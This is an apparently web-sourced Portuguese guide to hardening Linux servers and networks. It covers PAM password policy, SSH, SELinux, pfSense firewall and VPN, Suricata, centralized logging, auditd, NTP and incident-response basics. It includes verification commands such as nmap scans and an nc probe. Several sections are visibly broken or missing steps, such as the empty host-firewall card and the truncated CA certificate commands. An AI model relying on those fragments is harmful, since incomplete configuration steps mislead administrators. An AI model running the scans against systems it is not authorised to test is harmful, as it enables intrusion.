TLS 1.2 e 1.3 protegem a comunicação contra escuta (sniffing) e adulteração (MITM). Versões antigas (SSLv2/v3, TLS 1.0/1.1) têm falhas conhecidas e devem ser desabilitadas.

• PFS (Perfect Forward Secrecy): usa troca efêmera de chaves (ECDHE) para que, mesmo se a chave privada vazar no futuro, o tráfego gravado antes continue indecifrável.
• HSTS: cabeçalho HTTP que obriga o navegador a usar apenas HTTPS, bloqueando ataques de downgrade.
Segmentação & DMZ — isolar zonas de confiança diferentes. ⓘ detalhes
Em vez de colocar todos os servidores na mesma rede plana, divide-se a infraestrutura em zonas controladas por firewall com política default-deny (bloqueia tudo por padrão e libera só o necessário):
• WAN: internet / redes não confiáveis.
• DMZ: servidores expostos ao público (Web, proxy reverso, FTP).
• LAN / Interna: estações, AD, banco de dados.
• Management: acesso administrativo restrito.
Se um servidor na DMZ for comprometido, o firewall bloqueia o salto direto para a LAN.
Criptografia — quando usar simétrica, assimétrica ou hash. ⓘ detalhes
• Simétrica (AES-256-GCM, ChaCha20): mesma chave cifra e decifra — muito rápida; usada para cifrar o volume de dados em TLS, IPsec, OpenVPN e discos (LUKS/BitLocker).
• Assimétrica (RSA 4096, Ed25519/ECDSA): par de chaves pública/privada — usada em autenticação (SSH, certificados X.509) e troca inicial de chaves.
• Hash (SHA-256, Argon2/bcrypt): função de mão única — usada para integridade e armazenamento seguro de senhas (com salt).
Segurança + Disponibilidade — endurecer sem derrubar serviços. ⓘ detalhes
Um erro clássico ao endurecer servidores é bloquear o tráfego legítimo (ex.: mudar porta do SSH sem liberar SELinux/firewall e perder acesso, ativar TLS no FTP sem abrir portas/contextos, ou travar o acesso ao site com regra errada).

Regra profissional: faça backup do arquivo de config antes de editar, valide a sintaxe (sshd -t, httpd -t), teste a conexão em uma segunda sessão antes de fechar a atual e verifique sempre se o serviço continua respondendo como esperado.

PAM / IAMExpiração de senha e inativação de conta

login.defs · useradd -D · chage · limita janela de senha vazada
›
O que é / por que importa

Define validade máxima, aviso prévio e prazo para inativar contas com senha vencida. Senhas que nunca expiram (99999) aumentam indefinidamente a janela de abuso caso uma credencial vaze. Aplicar no /etc/login.defs vale para novos usuários; usar chage aplica para usuários já existentes.

Como aplicar
# 1) Padrão para NOVOS usuários — /etc/login.defs
PASS_MAX_DAYS   30    # ou o prazo exigido pela política (ex.: 14, 30, 90)
PASS_MIN_DAYS   1     # evita trocar e voltar imediatamente
PASS_WARN_AGE   7     # dias de aviso antes de expirar

# 2) Inativar conta N dias após a senha expirar (padrão de useradd):
useradd -D -f 1

# 3) Aplicar em um usuário JÁ EXISTENTE:
chage -M 30 -m 1 -W 7 -I 1 <usuario>
Como verificar
chage -l <usuario>
grep -E '^PASS_(MAX|MIN|WARN)' /etc/login.defs
🔴 Antes (inseguro)Maximum number of days: 99999 · Password inactive: never — senha eterna.
🟢 Depois (seguro)Maximum: 30 (ou política definida) · Warning: 7 · Inactive: 1.

PAM / IAMComplexidade de senha (pam_pwquality)

comprimento mínimo · classes de caracteres · anti-repetição
›
O que é / por que importa

Impõe força mínima na criação/troca de senhas pelo módulo PAM pam_pwquality. Sem complexidade, usuários escolhem senhas curtas ou previsíveis que caem em segundos em ataques de dicionário e força bruta. Note que valores negativos em dcredit/ucredit/lcredit/ocredit significam quantidade mínima obrigatória daquela classe.

Como aplicar
# /etc/security/pwquality.conf
minlen = 12          # comprimento mínimo (ex.: 10, 12 ou 14)
dcredit = -1         # exige pelo menos 1 dígito
ucredit = -1         # exige pelo menos 1 maiúscula
lcredit = -1         # exige pelo menos 1 minúscula
ocredit = -1         # exige pelo menos 1 caractere especial (quando exigido)
maxclassrepeat = 3   # máx. caracteres consecutivos da mesma classe
enforce_for_root     # aplica a regra também para o root

# RHEL/CentOS/Rocky 8/9 — garantir ativação no PAM:
authselect enable-feature with-pwquality
authselect apply-changes
Como verificar
echo 'abc123' | pwscore            # testa se a senha fraca é rejeitada
grep -vE '^\s*(#|$)' /etc/security/pwquality.conf
🔴 Antes (inseguro)Senhas curtas como abc123 passam sem restrição de classes ou tamanho.
🟢 Depois (seguro)Password quality check failed: The password is shorter than 12 characters.

PAM / IAMHistórico de senhas (pam_pwhistory)

impede reutilização de senhas antigas
›
O que é / por que importa

Guarda os hashes das últimas N senhas em /etc/security/opasswd e bloqueia reutilização. Sem histórico, o usuário troca a senha quando expira e volta para a mesma de antes — anulando a expiração e mantendo ativa uma credencial possivelmente comprometida.

Como aplicar
# RHEL/CentOS/Rocky — /etc/security/pwhistory.conf (RHEL 9+) ou /etc/pam.d/system-auth e password-auth:
# pwhistory.conf:
remember = 15
enforce_for_root

# Ou diretamente no PAM (logo após pam_pwquality.so):
password requisite pam_pwhistory.so use_authtok remember=15 retry=3

# Debian/Ubuntu — /etc/pam.d/common-password (na linha do pam_unix.so ou pam_pwhistory.so):
password required pam_pwhistory.so remember=15 use_authtok
Como verificar
grep -R "pwhistory" /etc/pam.d/ /etc/security/pwhistory.conf 2>/dev/null
# Teste prático: rodar passwd como usuário comum e tentar repetir uma senha anterior
🔴 Antes (inseguro)O usuário consegue repetir a mesma senha logo após a troca.
🟢 Depois (seguro)Password has been already used. Choose another.

PAM / IAMBloqueio de conta contra força bruta (pam_faillock)

bloqueia temporariamente após N falhas de login
›
O que é / por que importa

Bloqueia a conta automaticamente após poucas senhas incorretas consecutivas (substitui o antigo pam_tally2). É a principal defesa local contra força bruta online e password spraying. Cuidado para não bloquear a si mesmo sem saber destravar via faillock --reset.

Como aplicar
# /etc/security/faillock.conf
deny = 3               # tentativas antes de bloquear (ex.: 3 a 5)
fail_interval = 900    # janela de contagem (15 min)
unlock_time = 1500     # tempo bloqueado em segundos (ex.: 1500 = 25 min)
audit                  # registra tentativas no log de sistema

# RHEL/CentOS/Rocky 8/9:
authselect enable-feature with-faillock
authselect apply-changes
Como verificar
faillock --user <usuario>           # exibe contagem de falhas
faillock --user <usuario> --reset   # desbloqueia manualmente quando necessário
🔴 Antes (inseguro)Tentativas de login ilimitadas — atacante pode testar milhares de senhas.
🟢 Depois (seguro)The account is locked due to 3 failed logins (desbloqueio automático após 25 min).

IAMBanner legal, timeout de sessão (TMOUT), grupos e sudoers

/etc/issue · TMOUT · menor privilégio em grupos e sudo
›
O que é / por que importa

• Banner legal: informa explicitamente que o acesso é monitorado e restrito a autorizados (requisito legal/compliance — nunca revele versão do SO no banner!).
• Timeout (TMOUT): encerra sessões de terminal esquecidas abertas.
• Grupos e sudoers: aplica menor privilégio delegando apenas o comando necessário sem NOPASSWD: ALL.

Como aplicar
# 1) Banner legal (local e rede — sem dados do kernel/SO):
echo 'Acesso restrito a usuarios autorizados. Todas as acoes sao monitoradas.' > /etc/issue
cp /etc/issue /etc/issue.net

# 2) Timeout de inatividade no shell (ex.: 15 ou 20 min):
cat <<'EOF' > /etc/profile.d/timeout.sh
TMOUT=900
readonly TMOUT
export TMOUT
EOF
chmod 644 /etc/profile.d/timeout.sh

# 3) Criar grupos/usuários organizados e sudo mínimo (sempre via visudo):
groupadd equipe_ops
useradd -m -G equipe_ops <usuario>
# /etc/sudoers.d/ops (editado com visudo -f):
%equipe_ops ALL=(root) /usr/bin/systemctl restart httpd
Como verificar
cat /etc/issue /etc/profile.d/timeout.sh
visudo -c                     # valida sintaxe do sudoers sem risco de travar
id <usuario>
🔴 Antes (inseguro)Banner padrão expõe distro/kernel; sessões ficam abertas eternamente; usuários com (ALL) NOPASSWD: ALL.
🟢 Depois (seguro)Banner jurídico limpo, shell desconecta após inatividade e sudo restrito a comandos específicos.

SSHAutenticação por chave Ed25519 · sem root · sem senha

elimina força bruta de senha e acesso direto como root
›
O que é / por que importa

O SSH é o alvo nº 1 de varreduras e força bruta em servidores Linux. Exigir chaves criptográficas (Ed25519), desabilitar login direto de root e desligar autenticação por senha elimina praticamente todos os ataques automatizados de credenciais. Sempre copie e teste a chave antes de desativar senhas!

Como aplicar
# 1) No cliente — gerar chave moderna e copiar para o servidor:
ssh-keygen -t ed25519 -C "admin@empresa"
ssh-copy-id <usuario>@<IP_SERVIDOR>
# Teste o login por chave ANTES de alterar o sshd_config!

# 2) No servidor — /etc/ssh/sshd_config.d/99-hardening.conf (ou /etc/ssh/sshd_config):
PermitRootLogin no
PubkeyAuthentication yes
PasswordAuthentication no
PermitEmptyPasswords no
MaxAuthTries 3

# 3) Validar sintaxe e recarregar (mantenha uma sessão aberta para testar em outra):
sshd -t && systemctl reload sshd
Como verificar
sshd -T | grep -Ei 'permitrootlogin|passwordauthentication|pubkeyauthentication|maxauthtries'
🔴 Antes (inseguro)permitrootlogin yes e passwordauthentication yes — root exposto a força bruta.
🟢 Depois (seguro)permitrootlogin no · passwordauthentication no · login só com chave Ed25519.

SSHBanner, timeout, logging, bloqueio de túneis e regras Match

bloqueia pivoting por túnel SSH e personaliza por usuário/grupo
›
O que é / por que importa

Mesmo após autenticado, um invasor pode abusar de recursos do SSH para fazer pivoting (encaminhamento de portas TCP/túneis) ou sequestrar interface gráfica (X11). Desativar forwarding/túneis, encerrar sessões ociosas e elevar o log para VERBOSE (registra o fingerprint da chave usada) fecha essas brechas. Blocos Match permitem exceções finas no final do arquivo.

Como aplicar
# /etc/ssh/sshd_config (configuração global):
Banner /etc/issue.net
ClientAliveInterval 900       # 15 min (ou 1200 = 20 min)
ClientAliveCountMax 0         # desconecta imediatamente ao expirar
LogLevel VERBOSE              # registra fingerprint da chave utilizada
X11Forwarding no
AllowTcpForwarding no
PermitTunnel no
AllowAgentForwarding no

# Regras específicas SEMPRE no final do arquivo:
Match Group desenvolvedores
    X11Forwarding no
    AllowTcpForwarding no

sshd -t && systemctl reload sshd
Como verificar
sshd -T | grep -Ei 'banner|clientalive|loglevel|x11|forwarding|permittunnel'
🔴 Antes (inseguro)x11forwarding yes, allowtcpforwarding yes, sem timeout e log raso (INFO).
🟢 Depois (seguro)Banner exibido, sessão ociosa encerrada, túneis bloqueados e loglevel VERBOSE.

SSHPorta personalizada e restrição por IP (RHEL 9+ e legado)

Port + semanage port + firewalld rich rule / AllowUsers
›
O que é / por que importa

Restringir de quais IPs o SSH aceita conexão (ex.: apenas da rede de gerência ou bastion) reduz drasticamente o risco de acesso não autorizado. Mudar a porta padrão (ex.: 22 → 22222) reduz ruído de bots, mas exige ajustar SELinux + Firewall antes de reiniciar o sshd.
⚠️ Atenção de especialista (RHEL/CentOS 8/9+): tcp_wrappers (/etc/hosts.allow e hosts.deny) foi removido do OpenSSH moderno — use firewalld rich rules ou AllowUsers usuario@IP no sshd_config!

Como aplicar
# 1) Definir porta e restringir usuário/IP no /etc/ssh/sshd_config:
Port 22222
AllowUsers admin@10.0.10.0/24

# 2) Liberar a nova porta no SELinux (obrigatório em RHEL/CentOS/Rocky!):
semanage port -a -t ssh_port_t -p tcp 22222

# 3) Liberar no firewalld APENAS para o IP/sub-rede de gerência e fechar a porta 22:
firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="10.0.10.0/24" port port="22222" protocol="tcp" accept'
firewall-cmd --permanent --remove-service=ssh
firewall-cmd --reload
sshd -t && systemctl restart sshd

# (Nota para sistemas legados com libwrap/TCP Wrappers: /etc/hosts.allow "sshd: IP" e /etc/hosts.deny "sshd: ALL")
Como verificar
ss -tulpn | grep sshd
semanage port -l | grep ssh_port_t
ssh -p 22222 admin@<IP_SERVIDOR>
🔴 Antes (inseguro)SSH aberto na porta 22 para 0.0.0.0/0 (qualquer rede acessa).
🟢 Depois (seguro)sshd na porta 22222 com contexto ssh_port_t, aceitando só a rede de gerência.

SELinuxControle de Acesso Obrigatório (Enforcing, Contextos, Booleans e Audit)

nunca desative o SELinux — ajuste o contexto/boolean correto!
›
O que é / por que importa

O SELinux confina cada daemon (httpd_t, ftpd_t, sshd_t) aos arquivos, portas e ações exatos permitidos pela política. Desligar o SELinux porque "um serviço não funcionou" é uma das piores falhas de segurança possíveis. O especialista mantém Enforcing e ajusta contexto, porta, boolean ou cria módulo mínimo via audit2allow. (Em Ubuntu/Debian, o equivalente é o AppArmor: aa-status / aa-enforce.)

Como aplicar
# 1) Garantir modo Enforcing (imediato e persistente no /etc/selinux/config):
sed -i 's/^SELINUX=.*/SELINUX=enforcing/' /etc/selinux/config
setenforce 1

# 2) Rotular diretório customizado de serviço (ex.: upload FTP ou site web):
semanage fcontext -a -t public_content_rw_t "/var/ftp/upload(/.*)?"
restorecon -Rv /var/ftp/upload

# 3) Liberar porta personalizada e ajustar booleans persistentes (-P):
semanage port -a -t http_port_t -p tcp 8443
setsebool -P httpd_can_network_connect off   # ou ligar só o necessário (ex.: ftpd_full_access)

# 4) Diagnosticar negação (AVC denial) sem desligar o SELinux:
ausearch -m avc -ts recent
# Em último caso, gerar módulo mínimo e revisar antes de instalar:
ausearch -c vsftpd --raw | audit2allow -M custom_ftp && semodule -i custom_ftp.pp
Como verificar
sestatus; getenforce
ls -Zd /var/ftp/upload       # confirma o rótulo SELinux aplicado
getsebool -a | grep ftp
🔴 Antes (inseguro)Current mode: permissive ou disabled — serviços rodam sem confinamento MAC.
🟢 Depois (seguro)Current mode: enforcing, diretórios com rótulo correto e zero negações AVC indevidas.

FIREWALLFirewall de host default-deny (firewalld / ufw / nftables)

bloqueia tudo por padrão · libera só serviços necessários
›
O que é / por que importa

Mesmo atrás de um firewall de perímetro, cada servidor deve ter seu firewall local ativo (Defesa em Profundidade). Isso bloqueia movimento lateral caso outra máquina na mesma VLAN seja invadida. A regra é default-deny na entrada: remover serviços inúteis (como cockpit, dhcpv6-client, mdns) e abrir somente as portas do papel daquele servidor.

Como aplicar

PKI / LinuxAutoridade Certificadora (CA) e emissão de certificados com OpenSSL

O que é / por que importa

Como aplicar

openssl genrsa -aes256 -out rootCA.key 4096 && chmod 400 rootCA.key

  -subj "/C=BR/O=Empresa/CN=Empresa Root CA" -out rootCA.crt

# 2) Gerar chave + CSR do servidor (ex.: site.empresa.local):
openssl genrsa -out server.key 4096 && chmod 600 server.key
openssl req -new -key server.key -subj "/CN=site.empresa.local" -out server.csr

# 3) Assinar o CSR com a CA incluindo SAN (DNS/IP):
openssl x509 -req -in server.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial \
  -out server.crt -days 365 -sha256 -extfile <(printf "subjectAltName=DNS:site.empresa.local")
Como verificar
openssl verify -CAfile rootCA.crt server.crt
openssl x509 -in server.crt -noout -subject -issuer -dates -ext subjectAltName
🔴 Antes (inseguro)Chave fraca (1024 bits), sem SAN, chave privada com permissão 644 ou certificado sem cadeia válida.

2. Firewall > Rules > DMZ:
   • BLOQUEAR tráfego originado na DMZ com destino à LAN (impede movimento lateral)
   • PERMITIR apenas saída estritamente necessária (ex.: DNS/NTP/LogServer específico)
3. Firewall > Rules > LAN:
   • Substituir "Default allow LAN to any" por regras específicas (HTTP/HTTPS, DNS, SSH p/ gerência)
   • Marcar "Log packets handled by this rule" nas regras de bloqueio/críticas
4. System > Advanced > Admin Access:
   • Forçar HTTPS na GUI, desabilitar acesso administrativo pela WAN e restringir à rede de gerência.
Como verificar
# Da DMZ, testar acesso a um host da LAN (deve ser bloqueado e registrado):
nc -zv -w 2 <IP_LAN> 445
# No firewall: Status > System Logs > Firewall → confirmar bloqueio registrado
🔴 Antes (inseguro)Regra Allow Any to Any nas interfaces e painel do firewall acessível de qualquer zona.
🟢 Depois (seguro)DMZ isolada da LAN, apenas portas legítimas liberadas e GUI restrita à gerência via HTTPS.

PERÍMETRONAT / Port Forwarding seguro e filtros anti-spoofing na WAN

expor só o serviço da DMZ · bloquear RFC1918/Bogon na WAN
›
O que é / por que importa

Para publicar um site ou serviço externo, o firewall faz Port Forward (DNAT) apenas da porta necessária (ex.: TCP 443) para o servidor da DMZ — nunca exponha bancos de dados, SMB ou RDP direto na WAN. Além disso, ativar filtros Block private networks (RFC1918) e Block bogon networks na WAN real bloqueia pacotes forjados (IP spoofing) vindos da internet. (Obs.: em labs onde a "WAN" usa IP privado, desmarque "Block private" apenas se necessário para o roteamento do lab.)

Como aplicar (pfSense)
1. Firewall > NAT > Port Forward > Add:
   • Interface: WAN · Protocol: TCP · Dest Port: HTTPS (443)
   • Redirect target IP: <IP_WEBSERVER_DMZ> · Redirect target port: 443
   • Filter rule association: Add associated filter rule (gera regra específica automática)
2. Interfaces > WAN:
   • Em produção com WAN pública: marcar "Block private networks" e "Block bogon networks"
3. Firewall > Rules > WAN:
   • Conferir se existem APENAS as portas estritamente publicadas (ex.: 443, UDP 1194, UDP 500/4500).
Como verificar
# A partir de um host externo (WAN), varrer o IP público do firewall:
nmap -Pn -sT --top-ports 100 <IP_WAN_FW>   # deve mostrar só as portas intencionalmente publicadas
🔴 Antes (inseguro)Portas administrativas (22, 3389, 445, 8080) expostas na WAN ou redirecionamento 1:1 irrestrito.
🟢 Depois (seguro)Apenas HTTPS (443) redirecionado para a DMZ e portas de VPN estritamente necessárias na WAN.

VPNVPN Site-to-Site: IPsec (IKEv2) com autenticação por certificado

Fase 1 (IKEv2 + Mutual Cert) · Fase 2 (ESP + sub-redes) · regras IPsec
›
O que é / por que importa

Conecta duas redes corporativas (Matriz ↔ Filial) através de um túnel criptografado sobre a internet. Usar IKEv2 com autenticação mútua por certificado da CA interna é muito superior a PSK (chave pré-compartilhada), pois impede ataque de força bruta na senha compartilhada e facilita revogação. Lembre: Fase 1 autentica os firewalls; Fase 2 (ESP) protege o tráfego das sub-redes; e as regras de firewall na aba IPsec liberam o fluxo!

Como aplicar (em ambos os firewalls — pfSense)
1. System > Cert Manager:
   • Importar o certificado da Root CA interna (aba CAs)
   • Importar o certificado + chave privada deste firewall (aba Certificates)
2. VPN > IPsec > Tunnels > Add P1 (Fase 1):
   • Key Exchange: IKEv2 · Remote Gateway: <IP_WAN_OUTRO_FW>
   • Authentication Method: Mutual Certificate · My Certificate: cert do FW · Peer CA: Root CA
   • Encryption: AES256-GCM (ou AES-256 + SHA256 + DH Group 14+)
3. Add P2 (Fase 2 — nos dois lados, invertendo Local/Remote):
   • Local Network: sub-rede local · Remote Network: sub-rede remota · Protocol: ESP · AES256-GCM
4. Firewall > Rules > IPsec:
   • Permitir apenas o tráfego necessário entre as duas sub-redes (evite liberar tudo se houver restrição).
Como verificar
# No pfSense: Status > IPsec → túnel deve aparecer como ESTABLISHED (P1 e P2 ativos)
# De um host na Matriz para um host na Filial:
ping -c 3 <IP_HOST_FILIAL>   # e testar o serviço real (ex.: HTTPS/SSH)
🔴 Antes (inseguro)Tráfego entre unidades sem criptografia ou túnel usando IKEv1 + PSK fraca.
🟢 Depois (seguro)Túnel IPsec IKEv2 ESTABLISHED com certificado CA, criptografia AES-256 e tráfego validado entre LANs.

VPNVPN Remote Access: OpenVPN (SSL/TLS) e noções de WireGuard

certificado individual por usuário · revogável · acesso mínimo à LAN
›
O que é / por que importa

Permite que colaboradores remotos acessem recursos internos com segurança sem expor servidores à internet. Emitir um certificado individual por usuário (ou par de chaves no WireGuard) garante rastreabilidade (quem entrou?) e revogação instantânea caso um funcionário saia ou perca o notebook. Ative TLS Crypt/Auth para esconder o serviço de scanners na WAN.

Como aplicar (pfSense — OpenVPN)
1. System > Cert Manager:
   • Garantir CA + Server Certificate + User Certificate individual para cada usuário remoto
2. VPN > OpenVPN > Servers > Add (ou Wizard):
   • Server mode: Remote Access (SSL/TLS) — ou SSL/TLS + User Auth (2 fatores: cert + senha)
   • Protocol: UDP (porta 1194) · TLS Configuration: Use TLS Key (Encryption + Auth)
   • Tunnel Network: ex. 10.99.0.0/24 · Local Network(s): somente a sub-rede que o usuário precisa
3. Firewall > Rules:
   • WAN: permitir UDP 1194 · Aba OpenVPN: permitir apenas destinos/portas autorizados
4. VPN > OpenVPN > Client Export: exportar arquivo .ovpn e conectar no cliente remoto.
# Alternativa moderna: WireGuard (mais rápido, configuração minimalista baseada em chave pública/privada por peer).
Como verificar
# Status > OpenVPN → cliente remoto listado como CONNECTED com IP do túnel
# No cliente remoto: testar acesso ao servidor interno (ex.: curl -k https://<IP_INTERNO>)
🔴 Antes (inseguro)Acesso remoto direto por RDP/SSH exposto na WAN ou VPN com conta compartilhada sem certificado.
🟢 Depois (seguro)Cliente conectado via OpenVPN SSL/TLS com certificado individual acessando apenas os recursos liberados.

IDS / IPSDetecção e Prevenção de Intrusão no perímetro (Suricata / Snort)

detectar scans, exploits e C2 · diferença entre IDS e IPS
›
O que é / por que importa

O firewall filtra por IP e porta, mas não inspeciona o conteúdo de um ataque passando pela porta 443 ou 80. O IDS (Intrusion Detection System) analisa pacotes contra assinaturas de ataques e gera alertas; o IPS (Intrusion Prevention System) atua inline e bloqueia o tráfego malicioso automaticamente. No pfSense/Linux, Suricata e Snort são os padrões da indústria.

Como aplicar (pfSense — Suricata / Snort)
1. System > Package Manager > Available Packages → instalar Suricata (ou Snort).
2. Services > Suricata > Global Settings:
   • Habilitar regras "Emerging Threats Open Rules" (ET Open) e rodar Updates → Update Rules.
3. Interfaces > Add:
   • Escolher interface interna (LAN/DMZ — enxerga IPs reais antes do NAT) ou WAN
   • Habilitar "Send Alerts to System Log" (envia alertas automaticamente ao rsyslog central!)
   • Selecionar categorias relevantes (scan, exploit, web-attacks, malware)
   • Modo IDS: apenas alerta · Modo IPS: habilitar "Block Offenders" (após testar falsos positivos!).
4. Iniciar o serviço na interface e validar alertas.
Como verificar
# Gerar evento de teste controlado (ex.: scan de portas ou curl com user-agent de teste):
nmap -sS -p 22,80,443 <IP_ALVO>
# Conferir em Services > Suricata > Alerts (ou /var/log/suricata/fast.log) se o alerta foi disparado
🔴 Antes (inseguro)Sem inspeção de pacotes — scans, força bruta e payloads maliciosos passam sem nenhum alerta.
🟢 Depois (seguro)Suricata/Snort ativo com regras atualizadas, disparando alertas (e bloqueando em IPS) e enviando ao syslog.
Todos Centralização Retenção & Auditoria Recursos Tempo (NTP)

SYSLOGLogging centralizado (rsyslog remoto + Web + Firewall)

preserva evidências fora do host comprometido · porta 514 TCP / 6514 TLS
›
O que é / por que importa

Uma das primeiras ações de um invasor ao conquistar root é apagar /var/log/ para esconder rastros (Defense Evasion). Enviar logs em tempo real para um LogServer centralizado (ou SIEM como Wazuh/ELK) garante que as evidências sobrevivam ao comprometimento do servidor de origem. Prefira TCP (@@) em vez de UDP (@) para evitar perda de mensagens — e TLS (porta 6514) quando trafegar em redes sensíveis.

Como aplicar
# 1) No LogServer (receptor) — /etc/rsyslog.conf:
module(load="imtcp")
input(type="imtcp" port="514")
systemctl restart rsyslog
firewall-cmd --permanent --add-port=514/tcp && firewall-cmd --reload

# 2) Nos clientes Linux — /etc/rsyslog.d/99-remote.conf:
*.*  @@<IP_LOGSERVER>:514    # @@ = TCP confiável (@ = UDP)
systemctl restart rsyslog

# 3) Encaminhar logs do Apache (/etc/httpd/conf/httpd.conf):
ErrorLog "|/usr/bin/logger -t httpd-err -p local6.err"
CustomLog "|/usr/bin/logger -t httpd-acc -p local6.info" combined

# 4) No pfSense: Status > System Logs > Settings > Enable Remote Logging → IP do LogServer:514
Como verificar
# No cliente, enviar mensagem de teste:
logger -t teste_hardening "Validacao de envio remoto"
# No LogServer, confirmar recepção e porta aberta:
ss -tulpn | grep 514
grep "teste_hardening" /var/log/messages /var/log/syslog 2>/dev/null
🔴 Antes (inseguro)Logs gravados apenas localmente — se o host cair ou for invadido, os rastros somem.
🟢 Depois (seguro)Porta 514/TCP ativa no LogServer e eventos de Linux, Apache e pfSense chegando em tempo real.

RETENÇÃORetenção no journald e rotação com logrotate

evita disco cheio (DoS) e garante histórico mínimo de auditoria
›
O que é / por que importa

Logs sem rotação podem encher 100% da partição /var e travar o servidor (negação de serviço); logs sem retenção persistente somem no próximo reboot. Configurar journald persistente com retenção definida e logrotate (com compressão e data no nome) equilibra compliance forense e saúde do disco.

Como aplicar
# 1) systemd-journald — /etc/systemd/journald.conf:
Storage=persistent
Compress=yes
MaxRetentionSec=7day         # ajuste conforme a política (ex.: 7day, 30day, 90day)
systemctl restart systemd-journald

# 2) logrotate — /etc/logrotate.d/custom_app:
/var/log/custom/*.log {
    daily
    rotate 30
    compress
    delaycompress
    dateext
    missingok
    notifempty
    create 0640 root adm
}
Como verificar
logrotate -d /etc/logrotate.d/custom_app   # modo debug (simula rotação sem alterar)
journalctl --disk-usage
🔴 Antes (inseguro)Logs voláteis (somem no reboot) ou crescendo infinitamente sem rotação/compressão.
🟢 Depois (seguro)journald persistente com retenção definida e logrotate validado com compressão e dateext.

AUDITORIAAuditoria de arquivos críticos no kernel (auditd)

rastreia quem alterou /etc/passwd, /etc/shadow, /etc/sudoers ou sshd_config
›
O que é / por que importa

O Linux Audit Daemon (auditd) monitora chamadas de sistema diretamente no kernel. Permite saber exatamente qual usuário, PID e horário modificou arquivos críticos de identidade (/etc/passwd, /etc/shadow, /etc/sudoers) ou configurações de segurança — requisito direto dos CIS Benchmarks.

Como aplicar
# Criar regras persistentes em /etc/audit/rules.d/hardening.rules:
-w /etc/passwd -p wa -k identity_changes
-w /etc/shadow -p wa -k identity_changes
-w /etc/group  -p wa -k identity_changes
-w /etc/sudoers -p wa -k sudoers_changes
-w /etc/ssh/sshd_config -p wa -k ssh_config

# Carregar regras e garantir serviço ativo:
augenrules --load
systemctl enable --now auditd
Como verificar
auditctl -l                       # lista regras ativas no kernel
ausearch -k identity_changes      # busca eventos pela chave configurada
🔴 Antes (inseguro)No rules no auditctl -l — alterações em contas ou sudoers passam sem rastro detalhado.
🟢 Depois (seguro)Regras ativas para arquivos críticos e eventos consultáveis via ausearch -k.

RECURSOSLimites de processos e prioridades (limits.conf e nice)

protege disponibilidade contra fork bombs e abuso de CPU
›
O que é / por que importa

Segurança não é só confidencialidade — é também Disponibilidade. Sem limites de recursos (/etc/security/limits.conf), um único usuário ou processo com bug pode esgotar a tabela de processos (fork bomb) ou consumir 100% da CPU. Valores de nice vão de -20 (prioridade máxima) a +19 (prioridade mínima).

Como aplicar
# /etc/security/limits.conf (ou /etc/security/limits.d/99-hardening.conf):
*          hard core      0      # desabilita core dumps (evita vazamento de memória)
@usuarios  hard nproc     200    # protege contra fork bomb
@grupoA    -    priority  10     # prioridade baixa (nice +10)
@grupoB    -    priority -10     # prioridade alta  (nice -10)

# Ajuste pontual em execução:
nice -n 10 <comando>             # inicia processo com prioridade menor
renice -n -10 -u <usuario>       # altera prioridade de processos já ativos
Como verificar
ulimit -a
ps -eo pid,user,ni,comm | head -15   # coluna NI mostra o valor de nice
🔴 Antes (inseguro)core file size: unlimited e sem limites de processos/prioridade por grupo.
🟢 Depois (seguro)Core dumps desabilitados, nproc limitado e prioridades NI aplicadas corretamente.

TEMPO / NTPSincronização segura de relógio (chrony)

essencial para Kerberos (AD), certificados TLS e correlação forense
›
O que é / por que importa

Relógios dessincronizados derrubam a segurança inteira de uma empresa: o Kerberos (Active Directory) rejeita autenticações com diferença > 5 minutos; certificados TLS podem parecer expirados ou ainda inválidos; e investigações de incidentes ficam impossíveis se cada servidor registrar horários diferentes nos logs. Use chrony sincronizando de um pool confiável e restringindo quais redes internas podem consultá-lo.

Como aplicar (/etc/chrony.conf)
pool pool.ntp.org iburst          # ou servidor NTP corporativo / pool regional
allow 10.0.0.0/24                 # liberar APENAS a sub-rede interna que vai consultar este host
local stratum 10                  # fallback local se perder internet

systemctl enable --now chronyd
# Se este host servir NTP para a rede interna, liberar UDP 123 no firewall:
firewall-cmd --permanent --add-service=ntp && firewall-cmd --reload
Como verificar
chronyc tracking     # mostra drift e status de sincronia
chronyc sources -v   # fontes NTP conectadas (* = sincronizado)
chronyc clients      # clientes internos consultando este servidor
🔴 Antes (inseguro)chronyd desligado, relógio atrasado ou NTP aberto para qualquer IP externo (risco de amplificação DDoS).
🟢 Depois (seguro)Leap status: Normal, fonte marcada com ^* e allow restrito à sub-rede interna.

Evento × Alerta × Incidente — diferenciar ruído de ataque real. ⓘ detalhes
• Evento: qualquer ocorrência registrada em um sistema ou rede (ex.: um login bem-sucedido, uma conexão DNS).
• Alerta: aviso disparado por uma regra (SIEM/IDS/EDR) apontando atividade suspeita.
• Incidente: evento ou conjunto de alertas confirmados que violam políticas de segurança ou comprometem Confidencialidade, Integridade ou Disponibilidade.

Papel do analista: fazer a triagem rápida para descartar falsos positivos e responder imediatamente aos incidentes reais.
IOC × IOA — rastros estáticos vs. comportamento em curso. ⓘ detalhes
• IOC (Indicator of Compromise): evidência técnica deixada pelo ataque — hash SHA-256 de um arquivo malicioso, IP de C2, domínio malicioso, chave de registro ou caminho de webshell.
• IOA (Indicator of Attack): sequência comportamental que revela um ataque em andamento mesmo sem malware conhecido (ex.: o processo do servidor web invocando um shell e consultando contas privilegiadas).
Ordem de Volatilidade — coletar primeiro o que se perde rápido. ⓘ detalhes
Segundo a RFC 3227, evidências digitais devem ser coletadas da mais efêmera para a mais persistente:
1. Registradores/cache de CPU
2. Memória RAM, conexões de rede ativas, tabela ARP e processos em execução
3. Sistemas de arquivos temporários (/tmp, swap)
4. Disco rígido e logs locais
5. Logs remotos (SIEM/LogServer) e mídias de backup

Erro fatal: desligar ou reiniciar um servidor invadido antes de coletar RAM e conexões apaga provas cruciais!
Cadeia de Custódia — provar que a evidência não foi adulterada. ⓘ detalhes
A Cadeia de Custódia documenta quem coletou, transportou, armazenou e analisou cada evidência, com datas e assinaturas.

Tecnicamente, a integridade é garantida gerando o hash criptográfico (SHA-256) imediatamente na aquisição da imagem/arquivo e trabalhando sempre sobre uma cópia (montada em modo somente leitura ro,noexec), mantendo o original intacto.
Live Triage × Post-Mortem — máquina ligada vs. imagem de disco. ⓘ detalhes
• Live Triage: coleta rápida e cirúrgica com o sistema ainda ligado para identificar processos ativos, sessões de rede, memória RAM e conter um ataque em andamento sem tirar sistemas críticos do ar.
